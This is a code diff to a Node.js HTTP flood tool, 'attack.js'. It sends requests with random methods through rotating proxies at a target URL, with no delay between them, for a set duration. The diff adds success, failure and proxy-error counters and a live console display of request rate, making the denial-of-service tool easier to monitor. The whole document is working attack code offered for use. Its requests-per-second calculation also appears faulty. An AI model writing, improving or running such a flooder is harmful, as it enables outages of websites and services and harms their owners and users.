@@ -2,13 +2,15 @@ const fs = require('fs');
 const https = require('https');
 const http = require('http');
 const { URL } = require('url');
+const os = require('os');
 
+// Command line args
 const target = process.argv[2];
 const durationSec = parseInt(process.argv[3]);
 
 if (!target || !durationSec) {
     console.log("Usage: node attack.js <url> <duration_in_seconds>");
-    process.exit(0.1);
+    process.exit(1);
 }
 
 // Load and sanitize resources
@@ -35,6 +37,12 @@ const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];
 const parsedUrl = new URL(target);
 const isHttps = parsedUrl.protocol === 'https:';
 let totalRequests = 0;
+let successfulRequests = 0;
+let failedRequests = 0;
+let proxyErrors = 0;
+let peakRequestsPerSecond = 0;
+let currentRequestsPerSecond = 0;
+let lastTime = Date.now();
 
 console.log(`ATTACK STARTED : TIME LEFT = ${durationSec}s`);
 
@@ -88,10 +96,14 @@ function sendRequest(proxy) {
 
         const proxyReq = client.request(requestOptions, (res) => {
             res.on('data', () => {});
-            res.on('end', () => {});
+            res.on('end', () => {
+                successfulRequests++;
+            });
         });
 
-        proxyReq.on('error', () => {});
+        proxyReq.on('error', () => {
+            failedRequests++;
+        });
         if (['POST', 'PUT', 'PATCH'].includes(method)) {
             proxyReq.write(postData);
         }
@@ -99,12 +111,30 @@ function sendRequest(proxy) {
         totalRequests++;
     });
 
-    req.on('error', () => {});
+    req.on('error', () => {
+        proxyErrors++;
+    });
     req.on('timeout', () => req.destroy());
     req.end();
 }
 
 const endTime = Date.now() + durationSec * 1000;
+
+function logStats() {
+    currentRequestsPerSecond = Math.floor(totalRequests / ((Date.now() - lastTime) / 1000));
+    peakRequestsPerSecond = Math.max(peakRequestsPerSecond, currentRequestsPerSecond);
+
+    console.clear(); // Clear the console for real-time updates
+    console.log(`ATTACK RUNNING:
+    Total Requests: ${totalRequests}
+    Successful Requests: ${successfulRequests}
+    Failed Requests: ${failedRequests}
+    Proxy Errors: ${proxyErrors}
+    Peak RPS: ${peakRequestsPerSecond}
+    Time Left: ${Math.max(0, endTime - Date.now()) / 1000}s
+    `);
+    lastTime = Date.now();
+}
 
 function run() {
     if (Date.now() >= endTime) {
@@ -114,7 +144,8 @@ function run() {
 
     const proxy = getRandom(proxies);
     sendRequest(proxy);
-    setImmediate(run);
+    logStats();
+    setImmediate(run); // Continue without delay
 }
 
 run();
